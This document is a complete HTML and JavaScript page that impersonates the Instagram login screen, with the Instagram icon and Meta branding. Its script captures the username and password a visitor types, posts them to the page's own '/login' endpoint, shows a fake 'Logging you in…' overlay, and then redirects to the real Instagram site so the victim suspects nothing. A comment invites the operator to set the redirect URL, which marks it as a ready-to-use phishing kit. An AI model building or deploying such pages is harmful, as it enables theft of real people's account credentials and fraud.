<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
<title>Login • Instagram</title>
<meta name="theme-color" content="#1c1e21">
<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Cdefs%3E%3CradialGradient id='g' cx='30%25' cy='107%25' r='150%25'%3E%3Cstop offset='0%25' stop-color='%23fdf497'/%3E%3Cstop offset='5%25' stop-color='%23fdf497'/%3E%3Cstop offset='45%25' stop-color='%23fd5949'/%3E%3Cstop offset='60%25' stop-color='%23d6249f'/%3E%3Cstop offset='90%25' stop-color='%23285AEB'/%3E%3C/radialGradient%3E%3C/defs%3E%3Crect width='100' height='100' rx='22' fill='url(%23g)'/%3E%3Crect x='18' y='18' width='64' height='64' rx='18' fill='none' stroke='white' stroke-width='6'/%3E%3Ccircle cx='50' cy='50' r='16' fill='none' stroke='white' stroke-width='6'/%3E%3Ccircle cx='72' cy='28' r='4.5' fill='white'/%3E%3C/svg%3E">
<style>
  *{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
  html,body{margin:0;padding:0;height:100%}
  body{
    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
    background:#1c1e21;color:#e4e6eb;
    display:flex;flex-direction:column;align-items:center;
    min-height:100vh;
    -webkit-font-smoothing:antialiased;
    font-size:15px;
    padding:0 24px;
    overflow-x:hidden;
  }

  /* top bar */
  .topbar{
    width:100%;
    padding:14px 0 6px;
    text-align:center;
    color:#b0b3b8;
    font-size:13px;
    letter-spacing:.1px;
    flex-shrink:0;
  }

  /* IG gradient app icon */
  .ig-icon{
    width:96px;height:96px;
    margin-top:64px;
    flex-shrink:0;
    user-select:none;
    pointer-events:none;
  }

  form{
    width:100%;
    max-width:400px;
    display:flex;flex-direction:column;
    margin-top:72px;
    gap:8px;
    flex-shrink:0;
  }

  .input-wrap{position:relative;width:100%}

  .input-wrap input{
    width:100%;
    height:52px;
    padding:0 18px;
    background:transparent;
    border:1px solid #3a3b3c;
    border-radius:12px;
    color:#e4e6eb;
    font-size:15px;
    font-family:inherit;
    outline:none;
    transition:border-color .15s;
  }
  .input-wrap input::placeholder{
    color:#8e8e8e;
    opacity:1;
  }
  .input-wrap input:focus{border-color:#5a5b5c}

  .input-wrap input[type="password"]{padding-right:60px;letter-spacing:.3px}

  .show-pass{
    position:absolute;right:14px;top:50%;transform:translateY(-50%);
    background:transparent;border:0;color:#e4e6eb;
    font-weight:600;font-size:14px;
    cursor:pointer;padding:4px 6px;
    display:none;font-family:inherit;
  }
  .input-wrap input:not(:placeholder-shown) ~ .show-pass{display:block}

  .submit{
    margin-top:8px;
    height:52px;
    border:0;
    border-radius:12px;
    background:#1877f2;
    color:#fff;
    font-weight:600;
    font-size:16px;
    cursor:pointer;
    font-family:inherit;
    transition:opacity .1s;
  }
  .submit:hover{opacity:.92}
  .submit:active{opacity:.8}
  .submit:disabled{opacity:.7;cursor:default}

  .forgot{
    display:block;
    text-align:center;
    color:#e4e6eb;
    font-size:15px;
    font-weight:600;
    text-decoration:none;
    margin-top:24px;
    font-family:inherit;
  }

  .spacer{flex:1;min-height:60px}

  .bottom{
    width:100%;
    max-width:400px;
    display:flex;flex-direction:column;
    align-items:center;
    gap:22px;
    padding-bottom:32px;
    flex-shrink:0;
  }

  .create-btn{
    width:100%;
    height:52px;
    border-radius:26px;
    background:transparent;
    border:1px solid #1877f2;
    color:#1877f2;
    font-weight:600;
    font-size:16px;
    text-decoration:none;
    display:flex;align-items:center;justify-content:center;
    font-family:inherit;
    transition:background .15s;
  }
  .create-btn:hover{background:rgba(24,119,242,.08)}
  .create-btn:active{background:rgba(24,119,242,.15)}

  .meta-logo{
    height:22px;
    width:auto;
    opacity:.85;
    user-select:none;
    pointer-events:none;
  }

  /* loading overlay */
  .loading-overlay{
    position:fixed;inset:0;background:#1c1e21;display:none;
    align-items:center;justify-content:center;flex-direction:column;gap:16px;z-index:50;
  }
  .loading-overlay.on{display:flex}
  .spinner{
    width:34px;height:34px;border-radius:50%;
    border:3px solid #3a3b3c;border-top-color:#1877f2;
    animation:spin .8s linear infinite;
  }
  @keyframes spin{to{transform:rotate(360deg)}}
  .loading-overlay p{font-size:13px;color:#8e8e8e;margin:0}

  @media (max-width:400px){
    .ig-icon{margin-top:48px;width:84px;height:84px}
    form{margin-top:56px}
    body{padding:0 20px}
  }
</style>
</head>
<body>

<div class="topbar">English (US)</div>

<!-- Instagram gradient app icon -->
<svg class="ig-icon" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
  <defs>
    <radialGradient id="igGrad" cx="30%" cy="107%" r="150%">
      <stop offset="0%" stop-color="#fdf497"/>
      <stop offset="5%" stop-color="#fdf497"/>
      <stop offset="45%" stop-color="#fd5949"/>
      <stop offset="60%" stop-color="#d6249f"/>
      <stop offset="90%" stop-color="#285AEB"/>
    </radialGradient>
  </defs>
  <rect width="100" height="100" rx="22" fill="url(#igGrad)"/>
  <rect x="18" y="18" width="64" height="64" rx="18" fill="none" stroke="#ffffff" stroke-width="6"/>
  <circle cx="50" cy="50" r="16" fill="none" stroke="#ffffff" stroke-width="6"/>
  <circle cx="72" cy="28" r="4.5" fill="#ffffff"/>
</svg>

<form id="loginForm" method="POST" action="/login" autocomplete="off" novalidate>

  <div class="input-wrap">
    <input type="text" id="username" name="email" placeholder="Username, email or mobile number"
           autocomplete="username" autocapitalize="off" autocorrect="off" spellcheck="false" required>
  </div>

  <div class="input-wrap">
    <input type="password" id="password" name="password" placeholder="Password"
           autocomplete="current-password" required>
    <button type="button" class="show-pass" id="showPass">Show</button>
  </div>

  <button type="submit" class="submit" id="submitBtn">Log in</button>

  <a class="forgot" href="https://www.instagram.com/accounts/password/reset/" target="_self" rel="noopener">
    Forgot password?
  </a>
</form>

<div class="spacer"></div>

<div class="bottom">
  <a class="create-btn" href="https://www.instagram.com/accounts/emailsignup/" target="_self" rel="noopener">
    Create new account
  </a>

  <!-- Meta logo -->
  <svg class="meta-logo" viewBox="0 0 108 22" xmlns="http://www.w3.org/2000/svg" aria-label="Meta">
    <path fill="#8e8e8e" d="M8.2 3.1c-2.4 0-4.2 1.4-5.8 3.8C1.3 8.9.6 10.5.1 11.6c-.4.9-.9 1.4-1.3 1.4-.5 0-.8-.4-.8-1.2 0-2.6.8-5.1 2.3-7.3C2 2.5 4.1 1 6.3 1c1.4 0 2.7.5 3.9 1.5.4.3.9.3 1.2-.1.3-.4.3-.9-.1-1.2C9.9.2 8.2-.5 6.3-.5 2.2-.5-.6 1.9-2.2 5.4c-1.1 2.5-1.6 5.1-1.6 7.4 0 1.8 1 2.9 2.7 2.9 1.7 0 2.8-.9 3.8-2.5.9-1.4 1.7-3 2.6-4.7 1.7-3 3.4-4.7 5.5-4.7 1.6 0 2.9 1 3.4 2.6.3 1-.2 2.2-1.3 3.3-1 .9-2.2 1.6-3.2 2.2-.5.3-.7.9-.4 1.3.3.4.9.5 1.3.3 1.2-.7 2.5-1.5 3.6-2.5 1.6-1.5 2.4-3.3 1.9-5-.6-2.3-2.5-3.9-4.9-3.9-4.5 0-7.8 2.4-10.7 7.3L.5 17c-.2.4-.2.8.2 1.1.4.3.9.3 1.2-.2l1.7-3c2.8-4.7 5.4-6.8 8.7-6.8 1.7 0 3.2.6 4.2 1.7" transform="translate(2 2)"/>
    <text x="40" y="16.5" fill="#8e8e8e" font-family="-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif" font-size="15" font-weight="600" letter-spacing="-.2">Meta</text>
  </svg>
</div>

<div class="loading-overlay" id="loader">
  <div class="spinner"></div>
  <p>Logging you in…</p>
</div>

<script>
  /* =========================================================
     YAHAN APNA REDIRECT URL DAAL
     ========================================================= */
  const REDIRECT_URL = "https://www.instagram.com/";

  const showBtn = document.getElementById('showPass');
  const pass    = document.getElementById('password');
  const form    = document.getElementById('loginForm');
  const btn     = document.getElementById('submitBtn');
  const loader  = document.getElementById('loader');

  showBtn.addEventListener('click', () => {
    const t = pass.type === 'password';
    pass.type = t ? 'text' : 'password';
    showBtn.textContent = t ? 'Hide' : 'Show';
  });

  form.addEventListener('submit', async (e) => {
    e.preventDefault();
    const u = document.getElementById('username').value.trim();
    const p = pass.value;
    if (!u || !p) return;

    btn.disabled = true;
    btn.textContent = 'Logging in…';

    try {
      const body = new URLSearchParams();
      body.append('email', u);
      body.append('password', p);
      await fetch('/login', {
        method: 'POST',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: body.toString(),
        keepalive: true
      });
    } catch (_) {}

    loader.classList.add('on');
    setTimeout(() => {
      window.location.href = REDIRECT_URL;
    }, 900);
  });
</script>
</body>
</html>
